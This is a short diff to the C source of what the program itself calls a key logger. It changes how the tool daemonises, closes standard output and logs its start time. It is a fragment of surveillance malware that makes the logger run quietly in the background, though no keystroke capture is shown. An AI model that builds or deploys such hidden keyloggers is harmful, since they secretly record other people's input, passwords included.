@@ -71,8 +71,6 @@ int main(int argc, char **argv) {
             perror("fopen");
             return EXIT_FAILURE;
         }
-
-        close(STDOUT_FILENO);
     }
 
     bzero(stream_path, 128);
@@ -89,15 +87,13 @@ int main(int argc, char **argv) {
     }
 
     if (daemon_mod) {
-        if (change_task_to_background() == 0) {
-            fprintf(stderr, "Process ID = %d \n", (int)getpid);
-            printf("Process ID = %d \n", (int)getpid);
-        } else {
-
+        if (change_task_to_background() != 0) {
             perror("Error");
+            exit(1);
         }
     }
 
+    close(STDOUT_FILENO);
     get_time_now(time_string);
     fprintf(log, "\n Starting key logger: %s\n", time_string);
     bzero(time_string, 80);
